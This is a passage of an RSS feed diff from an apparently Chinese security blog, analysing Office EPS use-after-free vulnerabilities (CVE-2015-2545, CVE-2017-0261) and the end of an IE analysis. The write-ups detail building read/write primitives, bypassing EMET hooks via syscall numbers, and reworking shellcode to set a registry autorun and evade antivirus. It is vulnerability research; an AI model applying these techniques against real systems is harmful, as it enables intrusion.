+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-2-12_22-17-41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;write-what-where读写原语构造完毕，随后通过该读写原语获取函数地址，调用最终实现利用。&lt;/p&gt;
+
+&lt;h1 id=&quot;总结&quot;&gt;总结&lt;/h1&gt;
+
+&lt;p&gt;此次利用的手法和之前分析过的word EPS文件漏洞十分相似，EPS和JS都是脚本语言，共同点都是通过UAF来覆盖释放后的内存结构，构造一段读写原语，再通过读写原语写入构造好的write-what-where字符串的结构。通过write-what-where字符串便可以轻松实现函数的获取和调用了。&lt;/p&gt;
+
+&lt;p&gt;不同点在于JS对象和EPS的对象结构在内存的布局不同，导致利用时需要了解JS对象的内存布局后才能构造出write-what-where字符串，在EPS中的利用手法如绕过EMET的R3HOOK和EAF可以在IE漏洞中复用。&lt;/p&gt;
+
+&lt;p&gt;此次分析大部分的时间花在对各种JS对象内存结构的寻找上，经过查找资料和手动调试，对于ArrayBuffer、Element、Attribute等结构有了深入的了解，下次在分析有这些对象参与的POC和EXP时可以快速的定位到这些对象的内存，同时也找到了对象内置函数的调用位置，可以快速定位代码执行位置和执行结果。&lt;/p&gt;
+</description>
+        <pubDate>Fri, 18 Feb 2022 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2022/02/18/CVE-2021-26411.html</link>
+        <guid isPermaLink="true">http://localhost:4000/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2022/02/18/CVE-2021-26411.html</guid>
+        
+        <category>Internet-Explorer,</category>
+        
+        <category>Double-free</category>
+        
+        
+        <category>漏洞分析</category>
+        
+      </item>
+    
+      <item>
+        <title>CVE-2015-2545 EMET Bypass分析</title>
+        <description>&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;
+
+&lt;p&gt;该漏洞和上次分析的CVE-2017-0261为同一类型，同样是EPS文件解析产生的UAF漏洞，因此在分析时就不再讲解EPS的语法和相关结构了。分析该漏洞是因为样本能够完全绕过EMET，故此深入分析下绕过的原理并改造CVE-2017-0261绕过EMET。&lt;/p&gt;
+
+&lt;h2 id=&quot;调试环境&quot;&gt;调试环境&lt;/h2&gt;
+
+&lt;p&gt;调试是直接在Office2007上进行调试，调试环境如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;OS:			Win7 x64 SP1
+Office:		    	Ofiice 2007 x86
+Image name: 		EPSIMP32.FLT
+ImageSize:        	0x0006E000
+File version:     	2006.1200.4518.1014
+样本hash：	        375e51a989525cfec8296faaffdefa35
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h1&gt;
+
+&lt;h2 id=&quot;漏洞成因&quot;&gt;漏洞成因&lt;/h2&gt;
+
+&lt;p&gt;在分析之前说明下dict对象的结构：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211116160424215.png&quot; alt=&quot;image-20211116160424215&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;查看eps文件，漏洞触发代码如图所示：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909161555356.png&quot; alt=&quot;image-20210909161555356&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;forall操作符遍历dict对象，在执行过程中使用copy将一个新的dict对象拷贝到正在遍历的dict对象中，此时原本的dict对象将会被释放。接着通过构造特殊结构的字符串对象，覆盖被释放的dict对象的结构，导致在第二次遍历dict的对象时去获取了构造好的字符串对象，这样便产生了一个有限大小的读写原语。&lt;/p&gt;
+
+&lt;p&gt;在windbg中定位到forall操作符的代码，查看此时操作栈的对象可以发现xx_41为遍历的对象：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909161900919.png&quot; alt=&quot;image-20210909161900919&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接着定位到copy操作符所在位置，查看此时操作栈的情况可以得知xx_41将会被xx_18467覆盖：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909162334445.png&quot; alt=&quot;image-20210909162334445&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;继续深入分析，到图中所示执行操作符delete位置时，查看参数：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909170805435.png&quot; alt=&quot;image-20210909170805435&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;经过分析可以发现eax的值正是xx_41中的keyZ1:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909172455780.png&quot; alt=&quot;image-20210909172455780&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;查看keyZ1，正是Dict_Object对象，里面储存的为0x1000大小的array对象：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211116161548995.png&quot; alt=&quot;image-20211116161548995&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;当执行完delete后，keyZ1所占有的内存被释放，随后一直循环delete直到整个xx_41的内容全部被释放。&lt;/p&gt;
+
+&lt;p&gt;执行完copy后，查看操作栈中发现xx_41的内容已经变成xx_18467：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909195153651.png&quot; alt=&quot;image-20210909195153651&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;当执行到putinterval时，可以看到由于创建的字符串大小为35(0x23)，实际会分配0x24大小的结构用于存储字符串，而该大小正是dict对象结构的大小。因此当keyZ2被释放后，此时再次创建一个0x24大小的字符串将会占用keyZ2的内存空间：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909203306735.png&quot; alt=&quot;image-20210909203306735&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;forall第二次要取的值仍为原来的keyZ2，但此时keyZ2指向的内存已经被故意构造的字符串占用，导致了UAF：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210909204254869.png&quot; alt=&quot;image-20210909204254869&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;当forall执行第二遍时，此时将把故意构造的字符串当作dict对象获取到操作栈中，key和value会被压入栈中：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210910094751189.png&quot; alt=&quot;image-20210910094751189&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;最终xx_26500获取了字符串，xx_19169获取了整数，从xx_26500的结构可以看出构造了一个大小为0x2710的读写原语：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211116101956346.png&quot; alt=&quot;image-20211116101956346&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;漏洞原理部分分析完毕。&lt;/p&gt;
+
+&lt;h1 id=&quot;漏洞利用&quot;&gt;漏洞利用&lt;/h1&gt;
+
+&lt;h2 id=&quot;构造读写原语&quot;&gt;构造读写原语&lt;/h2&gt;
+
+&lt;p&gt;接下来参考上次分析的CVE-2017-0261的漏洞利用部分，尝试在了解漏洞原理的基础上自己构造读写原语，构造思路如下：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;利用获取到的0x2710大小的xx_26500字符串对象构造指向string结构的0x30结构和0x28的string结构&lt;/li&gt;
+  &lt;li&gt;获取0x30结构和0x28结构的首地址，并使用两个地址指向首地址&lt;/li&gt;
+  &lt;li&gt;将构造好的读写原语的首地址放置在任意一个string对象的value2&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;构造字符串结构很容易，但是要能获取到结构所在地址。因此在结构的位置上选取了xx_26500字符串中0xfc的位置，该位置存储的内容为指向后四个字节的地址可以准确的定位，因此将该值作为stringbase：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211116163040737.png&quot; alt=&quot;image-20211116163040737&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接着开始构造指向string结构的0x30结构和0x28的string结构，通过putinterval操作符将构造好的结构放入stringbase+0xc的位置：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211116180754750.png&quot; alt=&quot;image-20211116180754750&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;将0x30结构的首地址放入stringbase中，0x28结构的首地址放入stringbase+4中，将stringbase+4的地址放入0x28结构的首地址0x24中，这样0x30结构就指向了0x28结构。具体的eps代码和结构如下图所示：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211117192302813.png&quot; alt=&quot;image-20211117192302813&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;构造好读写原语的相关结构后，就需要把结构首地址放置在任意一个string对象的value2后，这一步打算重复漏洞触发的过程，将构造好的读写原语的PostScript结构字符串覆盖原本正常的dict结构，最终获得了一个能够读写任意内存的读写原语：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118103740956.png&quot; alt=&quot;image-20211118103740956&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;emet-bypass分析&quot;&gt;EMET Bypass分析&lt;/h2&gt;
+
+&lt;p&gt;样本在构造ROP这里开始Bypass EMET，不像一般的ROP直接调用VirtualProtect来修改内存属性，而是调用ZwProtectVirtualMemory。但是EMET对ZwProtectVirtualMemory进行hook，因此不能直接调用。样本获取到ZwProtectVirtualMemory的地址后会往后遍历，当遍历到retn后计数加一，直到遍历到没有被hook的函数后获取该函数的调用号，将调用号减去retn计数就得到了ZwProtectVirtualMemory原本的调用号：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118200720456.png&quot; alt=&quot;image-20211118200720456&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过ROP将调用号赋值给eax，之后再通过调用未被hook的ZwCreateEvent函数的后5个字节直接调用ZwProtectVirtualMemory修改shellcode的内存：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118203213331.png&quot; alt=&quot;image-20211118203213331&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到此时ZwProtectVirtualMemory是被hook的，而通过这种方式则完美绕过了hook：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118204947902.png&quot; alt=&quot;image-20211118204947902&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然而只绕过hook是不够的，需要shellcode绕过EAF，样本通过fs:[0]获取SEH链拿到msvcrt.dll的句柄，随后通过回退搜索MZ头寻找msvcrt.dll的基地址。通过msvcrt.dll的导入表获取函数地址并最终将shellcode后的PE文件写入到本地文件中并启动：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118211034227.png&quot; alt=&quot;image-20211118211034227&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;利用手法移植&quot;&gt;利用手法移植&lt;/h2&gt;
+
+&lt;p&gt;在了解了样本的绕过思路后，在CVE-2017-0261上尝试绕过EMET。&lt;/p&gt;
+
+&lt;p&gt;首先将原本获取VirtualProtect的地址改为获取NtProtectVirtualMemory和NtCreateEvent：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211118212457524.png&quot; alt=&quot;image-20211118212457524&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;随后修改ROP链直接通过ZwProtectVirtualMemory的调用号调用ZwCreateEvent+0x5的位置修改内存属性，成功绕过了EMET：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211119115826229.png&quot; alt=&quot;image-20211119115826229&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;shellcode由于样本采用了PE文件落地的方式，容易被查杀，因此修改shellcode采取syscall的方式直接写注册表自启项，最终成功绕过了EAF：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20211119140836753.png&quot; alt=&quot;image-20211119140836753&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;总结&quot;&gt;总结&lt;/h1&gt;
+
+&lt;p&gt;CVE-2015-2545是EPS文件解析类的首个漏洞，CVE-2016-0261无论是在漏洞触发和漏洞利用上都和该漏洞十分相似，连辅助函数都基本和2545保持一致。不同的是该样本通过syscall绕过了EMET对于关键函数的hook，这种绕过的思路可以应用在其他具有能读写任意内存的读写原语的漏洞中。同时shellcode也与传统的从PEB结构直接获取kernerl32.dll的基地址不同，通过SEH链获取msvcrt.dll的基地址在获取导入表函数地址绕过EAF，这种利用都是值得借鉴的。&lt;/p&gt;
+
+&lt;h1 id=&quot;参考链接&quot;&gt;参考链接&lt;/h1&gt;
+
+&lt;p&gt;[1] &lt;a href=&quot;https://bbs.pediy.com/thread-216046.htm&quot;&gt;野外的 CVE-2015-2545 逃逸了 EMET&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[2] &lt;a href=&quot;https://paper.seebug.org/368/&quot;&gt;CVE-2015-2545 Word 利用样本分析&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Fri, 19 Nov 2021 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2021/11/19/CVE-2015-2545.html</link>
+        <guid isPermaLink="true">http://localhost:4000/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2021/11/19/CVE-2015-2545.html</guid>
+        
+        <category>Office,</category>
+        
+        <category>Use-after-free</category>
+        
+        
+        <category>漏洞分析</category>
+        
+      </item>
+    
+      <item>
+        <title>CVE-2017-0261 EPS文件解析漏洞分析</title>
+        <description>&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;
+
+&lt;p&gt;第一次分析EPS类漏洞，对于PostScript格式十分陌生，通过查阅&lt;a href=&quot;https://www.adobe.com/content/dam/acom/en/devnet/actionscript/articles/PLRM.pdf&quot;&gt;PostScript LANGUAGE REFERENCE&lt;/a&gt;了解PostScript格式。调试EXP来自kcufld师傅的&lt;a href=&quot;https://github.com/kcufId/eps-CVE-2017-0261&quot;&gt;eps-CVE-2017-0261&lt;/a&gt;，EXP在Office 2007可以正常运行，但在Office 2010以上版本需要配合提权漏洞逃逸沙箱后完成利用。&lt;/p&gt;
+
+&lt;h2 id=&quot;调试环境&quot;&gt;调试环境&lt;/h2&gt;
+
+&lt;p&gt;调试是直接使用kcufld师傅的eps加载器进行调试，EPSIMP32.FLT版本信息如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;OS:			Win7 x64 SP1
+Office:		    	Ofiice 2007 x86
+Image name: 		EPSIMP32.FLT
+ImageSize:        	0x0006E000
+File version:     	2006.1200.4518.1014
+Product version:  	2006.1200.4518.0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h1&gt;
+
+&lt;h2 id=&quot;postscript格式简介&quot;&gt;PostScript格式简介&lt;/h2&gt;
+
+&lt;p&gt;先介绍下PostScript基本的数据结构：&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;SIMPLE OBJECTS&lt;/th&gt;
+      &lt;th&gt;COMPOSITE OBJECTS&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;boolean&lt;/td&gt;
+      &lt;td&gt;array&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;fontID&lt;/td&gt;
+      &lt;td&gt;dictionary&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;integer&lt;/td&gt;
+      &lt;td&gt;file&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;mark&lt;/td&gt;
+      &lt;td&gt;gstate (LanguageLevel 2)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;name&lt;/td&gt;
+      &lt;td&gt;packedarray (LanguageLevel 2)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;null&lt;/td&gt;
+      &lt;td&gt;save&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;operator&lt;/td&gt;
+      &lt;td&gt;string&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;real&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;左侧为简单对象，右侧为复合对象。简单对象都是原子实体，类型、属性和值不可逆转地结合在一起，不能改变。但复合对象的值与对象本身是分开的，对象本身存储于操作栈中，具体的结构如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// PostScript Object
+struct PostScript object
+{
+    dword    type;		//对象类型		
+    dword    attr;		
+    dword    value1;	//指向对象所属变量名称
+    dword    value2;	//若为简单对象，直接指向值；若为复合对象，指向存储的值的结构
+}ps_obj;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;其中部分type的值与类型的映射如下：&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;type值&lt;/th&gt;
+      &lt;th&gt;数据类型&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x0&lt;/td&gt;
+      &lt;td&gt;nulltype&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x3&lt;/td&gt;
+      &lt;td&gt;integertype&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x5&lt;/td&gt;
+      &lt;td&gt;realtype&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x8&lt;/td&gt;
+      &lt;td&gt;booleantype&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x10&lt;/td&gt;
+      &lt;td&gt;operatortype&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x20&lt;/td&gt;
+      &lt;td&gt;marktype&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x40&lt;/td&gt;
+      &lt;td&gt;savetype&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x300&lt;/td&gt;
+      &lt;td&gt;nametype&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x500&lt;/td&gt;
+      &lt;td&gt;stringtype&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x900&lt;/td&gt;
+      &lt;td&gt;filetype&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x30000&lt;/td&gt;
+      &lt;td&gt;arraytype&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x70000&lt;/td&gt;
+      &lt;td&gt;packedarraytype&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x0B0000&lt;/td&gt;
+      &lt;td&gt;packedarraytype&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x110000&lt;/td&gt;
+      &lt;td&gt;dicttype&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x210000&lt;/td&gt;
+      &lt;td&gt;gstatetype&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;接着介绍下漏洞中使用到的比较关键的操作符的意义：&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;操作符&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;示例&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;解析&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;forall&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;array  proc  forall&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;枚举第一个操作数的元素，为每个元素执行过程 proc。如果第一个操作数是数组、压缩数组或字符串对象，则 forall 将一个元素压入操作数堆栈，并对对象中的每个元素执行 proc，从索引为 0 的元素开始并依次执行。&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;dup&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;any  dup —&amp;gt; any  any&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;复制操作数堆栈上的顶部元素。 dup 只复制对象；复合对象的值不是复制而是共享的。&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;putinterval&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;array1  index  array2  putinterval&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;用第三个操作数的全部内容替换第一个操作数的元素的子序列。被替换的子序列从第一个操作数的 index 开始；它的长度与第三个操作数的长度相同。&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;put/get&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;array  index  any  put/get&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;替换/获取第一个操作数的一个元素的值。如果第一个操作数是一个数组或一个字符串，put/get将第二个操作数视为一个索引，并将第三个操作数存储在索引所确定的位置，从0开始计算。&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;save&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;/save save&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;保存当前VM状态快照，一个快照只能使用一次。&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;restore&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;save restore&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;丢弃本地VM中自相应保存以来创建的所有对象，并回收它们占用的内存；将本地VM中所有复合对象的值（字符串除外）重置为保存时的状态；关闭自相应保存以来打开的文件，只要这些文件在local VM 分配模式有效时打开。&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;了解了上述背景后，开始分析漏洞。&lt;/p&gt;
+
+&lt;h2 id=&quot;漏洞成因&quot;&gt;漏洞成因&lt;/h2&gt;
+
+&lt;p&gt;通过使用forall操作符获取创建的字符串对象，并在第一次循环时使用restore操作符释放字符串对象，随后创建新的字符串对象使得原本存储旧字符串对象的结构被新复合对象代替。若故意构造大小为0x27的字符串对象，则字符串被释放后会多出0x28的内存空间，此时立即创建新的字符串对象，则该内存会用来存储指向新字符串的string结构。随后通过改变forall的函数，获取指向新字符串的结构。&lt;/p&gt;
+
+&lt;p&gt;漏洞文件中一共触发了三次漏洞，第一次是获取了被释放的string的字符用于判断系统是32位还是64位。第二次触发故意构造大小为0x27的string对象，用于获取指向恶意string的结构。第三次则利用第二次构造的特殊string结构创造了一个起始地址为0x00000000，大小为0x7fffffff的字符串，构造了能够读写任意地址内存的读写原语。接着利用读写原语搜索内存中函数地址构造ROP链。最终创建了一个文件对象，在调用closefile操作符时跳转执行ROP完成漏洞利用。&lt;/p&gt;
+
+&lt;p&gt;查看poc.eps文件，第一次调用forall如图所示：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210903105452944.png&quot; alt=&quot;image-20210903105452944&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在ida中定位到forall操作符的代码：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210902173157063.png&quot; alt=&quot;image-20210902173157063&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;使用windbg找到对应偏移后下断：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sxe ld EPSIMP32;g;bp EPSIMP32+2b928;g;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210831150138806.png&quot; alt=&quot;image-20210831150138806&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;运行到图中所示位置时查看edi的值，指向了操作栈，查看后发现有两个对象在栈中，第一个为string l63，第二个为array l61&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210910180510699.png&quot; alt=&quot;image-20210910180510699&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;继续分析，会获取l63和l61对象到栈中，并确认l63的类型为string后，跳转到获取string类型元素部分&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210831161042602.png&quot; alt=&quot;image-20210831161042602&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;获取值的过程会因为type的不同而有所变化，具体如图所示：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210901172253284.png&quot; alt=&quot;image-20210901172253284&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过调试可以更加直观的看到通过value2获取string的方式：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210831171553055.png&quot; alt=&quot;image-20210831171553055&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接着循环获取string中的每一个元素并执行函数：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210831192324185.png&quot; alt=&quot;image-20210831192324185&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;此时传入deferred_exec的参数为eax，查看传入参数：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:000&amp;gt; bp EPSIMP32+2ba06          //call    deferred_exec
+0:000&amp;gt; g
+Breakpoint 1 hit
